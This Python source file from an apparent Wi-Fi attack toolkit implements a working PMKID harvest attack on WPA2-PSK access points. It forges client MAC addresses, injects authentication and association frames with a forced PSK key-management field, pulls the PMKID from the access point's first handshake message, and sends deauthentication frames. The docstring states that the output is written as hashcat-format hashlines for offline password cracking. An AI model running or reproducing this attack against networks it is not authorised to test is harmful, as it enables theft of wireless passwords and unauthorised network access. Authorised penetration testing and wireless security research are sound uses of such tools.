"""PMKID harvest attack (hcxdumptool-style, native).

Sequence per attempt:
    1. Inject Auth Req (Open System, seq=1) from a forged client MAC.
    2. Listen briefly for Auth Resp (status=0 means the AP will engage).
    3. Inject Assoc Req carrying a forced-PSK RSN IE (the AP's ciphers, AKM=PSK)
       + SSID + rates, a client selects one AKM, and PSK is what yields a
       harvestable PMKID; we bail first if the AP offers no PSK AKM.
    4. Wait for the AP's EAPOL M1. Many WPA2-PSK APs ship a PMKID KDE in
       the Key Data. The existing frame parser surfaces it as
       ``parsed['eapol_pmkid']`` and the WlanInterface populates
       ``AP.handshakes[source].pmkid`` for free.
    5. Deauth the AP and stop the moment M1 arrives. M1 is terminal: we can't
       send M2 (no PSK for its MIC), so a PMKID-less M1 means this AP exposes
       none. Give up rather than retry the same empty M1, and even on success
       the deauth frees the AP from retransmitting M1 for ~5 s. We only rotate
       the MAC and retry when the AP stays *silent* (a lost Auth/Assoc).

The attack returns the harvested 16-byte PMKID, or ``None`` if the AP answers
with a PMKID-less M1 (or never answers). Cracker-side, the existing
``persist/hc22000_write.write_hc22000`` writes a ``WPA*01*…`` hashline whenever
``hs.pmkid`` is set.
"""

from __future__ import annotations

import asyncio
import enum
import logging
import os
import time
from typing import Optional

from wifit3.models import AccessPoint
from wifit3.dot11 import build_deauth, mac_to_str, str_to_mac
from wifit3.dot11.ie import force_psk_akm, GENERIC_RSN_IE

from .campaign import Campaign
from .auth_assoc import Association

logger = logging.getLogger(__name__)


class PmkidFail(enum.Enum):
    """Why a PMKID harvest failed."""
    PMF_REQUIRED = "pmf_required"   # AP only associates protected (802.11w) clients
    NO_PSK_AKM = "no_psk_akm"       # AP offers no PSK AKM to harvest (e.g. SAE-only)
    NO_KDE = "no_kde"               # M1 arrived but carried no PMKID KDE
    NO_RESPONSE = "no_response"     # never got an M1 (AP stayed silent)


_AKM_PSK = 0x02                  # 00-0F-AC:2 (PSK).
_HARVESTABLE_AKMS = (_AKM_PSK,)  # AKMs whose PMK we can harvest *and* crack offline.


def _random_client_mac() -> bytes:
    """Locally-administered, unicast MAC (LAA bit set, multicast bit clear)."""
    rnd = os.urandom(5)
    return bytes([0x02]) + rnd


class PmkidHarvestAttack(Campaign):
    """Run a PMKID harvest against a single AP."""

    button_id = "btn-pmkid"
    key = "pmkid"
    hotkey = ("p", "PMKID")
    stoppable = True
    idle_label = "PMKID"
    run_label = "Stop PMKID"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        """Shown when the AP advertises a harvestable (PSK) AKM, OR when its
        encryption isn't confirmed yet."""
        akms = set(getattr(ap, "akm_suites", None) or ())
        if set(_HARVESTABLE_AKMS) & akms:
            return True   # confirmed harvestable PSK
        if akms:
            return False  # confirmed AKM(s), none harvestable
        return getattr(ap, "encryption", None) in (None, "Unknown")  # unconfirmed → disabled

    @classmethod
    def ineligible_reason(cls, ap) -> Optional[str]:
        """None (enabled) once a PSK AKM is confirmed and the SSID is known."""
        if ap.is_hidden:
            return "hidden SSID: can't associate"
        if set(_HARVESTABLE_AKMS) & set(getattr(ap, "akm_suites", None) or ()):
            return None
        return "encryption not confirmed yet (no beacon RSN)"

    def __init__(
        self,
        array,
        target: AccessPoint,
        source_mac: Optional[bytes] = None,
        attempts: int = 3,
        m1_timeout: float = 2.0,
        log=None,
    ):
        super().__init__(ap=target, array=array)
        self.target = target
        self.bssid_bytes = str_to_mac(target.bssid)
        self.source_mac = source_mac or _random_client_mac()
        self.attempts = attempts
        self.m1_timeout = m1_timeout
        self.log = log or (lambda m: None)
        self.fail_reason: Optional[PmkidFail] = None
        self.pmkid: Optional[bytes] = None
        # The Assoc RSN IE (single AKM=PSK), rebuilt from the AP's ciphers.
        self._assoc_rsn_ie: bytes = GENERIC_RSN_IE

    @property
    def client_mac(self) -> str:
        """The forged STA MAC we currently impersonate."""
        return mac_to_str(self.source_mac)

    def _rotate_mac(self) -> None:
        self.source_mac = _random_client_mac()

    # ---- Frame builders -----------------------------------------------------

    def _build_deauth(self) -> bytes:
        """802.11 Deauthentication (reason 3 = STA leaving) from our forged MAC to the AP."""
        return build_deauth(self.bssid_bytes, self.source_mac, self.bssid_bytes, 3)

    # ---- Driver -------------------------------------------------------------

    def _received_m1(self):
        """The parser-created Handshake for our forged MAC on this AP once M1 lands."""
        ap_state = self.array.access_points.get(self.target.bssid.lower())
        if not ap_state:
            return None
        return ap_state.handshakes.get(mac_to_str(self.source_mac))

    async def _send_leaving_deauth(self, count: int = 3) -> None:
        """Deauth the AP (×count) the instant we have M1 (we're done)."""
        frame = self._build_deauth()
        for _ in range(count):
            await self.iface.send_no_wait(frame)
            await asyncio.sleep(0.003)

    async def _loop(self) -> None:
        """Try up to ``self.attempts`` association rounds."""
        self.fail_reason = None

        # PMF Required: the AP only associates protected (802.11w) clients
        if self.target.pmf_required:
            self.fail_reason = PmkidFail.PMF_REQUIRED
            logger.info("[PMKID] %s is PMF-Required, unharvestable, skipping.",
                        self.target.bssid)
            return

        # Force a single AKM = PSK in our Assoc IE
        akm = next((a for a in _HARVESTABLE_AKMS
                    if a in (self.target.akm_suites or ())), None)
        if akm is None:
            self.fail_reason = PmkidFail.NO_PSK_AKM
            logger.info("[PMKID] %s offers no PSK AKM (akm_suites=%s), can't harvest.",
                        self.target.bssid, self.target.akm_suites)
            return
        # The generic is a valid RSN IE
        base_rsn = self.target.rsn_ie or GENERIC_RSN_IE
        self._assoc_rsn_ie = (
            force_psk_akm(base_rsn, akm, pmf_capable=self.target.pmf_capable) or GENERIC_RSN_IE
        )
        logger.info("[PMKID] forged Assoc RSN IE (AKM→PSK 0x%02x, mfp_capable=%s): %s",
                    akm, self.target.pmf_capable, self._assoc_rsn_ie.hex())

        async with self.array.lease(channel=self.target.channel, iface=self.iface) as iface:
            for attempt in range(1, self.attempts + 1):
                if self.stopped:
                    return
                arm = self.array.lease(fake_mac=self.source_mac, bssid=self.bssid_bytes,
                                       iface=iface)
                async with arm:
                    if arm.mac:
                        self.source_mac = str_to_mac(arm.mac)
                    logger.info(
                        f"[PMKID] Attempt {attempt}/{self.attempts}: Auth + Assoc Req to "
                        f"{self.target.bssid} as {mac_to_str(self.source_mac)}"
                    )
                    self.log(f"Auth → Assoc [dim bold](client MAC: {self.client_mac})[/dim bold]"
                             + (f" [dim](retry {attempt})[/dim]" if attempt > 1 else ""))
                    assoc = Association(iface, self.target.bssid, self.target.ssid or "",
                                        self.target.channel, our_mac=self.source_mac,
                                        assoc_trailer_ies=self._assoc_rsn_ie,
                                        should_stop=lambda: self.stopped)
                    assoc.start()
                    try:
                        await assoc.associate()
                    finally:
                        assoc.stop()

                    # Poll the parser-populated handshake dict for our forged MAC's M1.
                    deadline = time.time() + self.m1_timeout
                    while time.time() < deadline:
                        if self.stopped:
                            return
                        hs = self._received_m1()
                        if hs is not None:
                            await self._send_leaving_deauth()
                            if hs.pmkid:
                                if hs.pmkid_akm is None:
                                    hs.pmkid_akm = _AKM_PSK   # we negotiated PSK in our Assoc
                                logger.info(
                                    f"[PMKID] Harvested {hs.pmkid.hex()} from {self.target.bssid} "
                                    f"(STA {mac_to_str(self.source_mac)})"
                                )
                                self.log("[bold]M1[/bold] received: "
                                         "[bright_green]PMKID present[/bright_green]")
                                self.pmkid = hs.pmkid
                                return
                            self.fail_reason = PmkidFail.NO_KDE
                            logger.info(
                                f"[PMKID] {self.target.bssid} answered with a PMKID-less M1: "
                                f"this AP doesn't expose one; not retrying."
                            )
                            return
                        await asyncio.sleep(0.05)

                logger.info(
                    f"[PMKID] Attempt {attempt}: no M1 (AP silent), rotating MAC and retrying."
                )
                self.log("[bold orange1]M1 not received[/bold orange1] "
                         "[dim](AP silent, rotating MAC)[/dim]")
                self._rotate_mac()

        self.fail_reason = PmkidFail.NO_RESPONSE
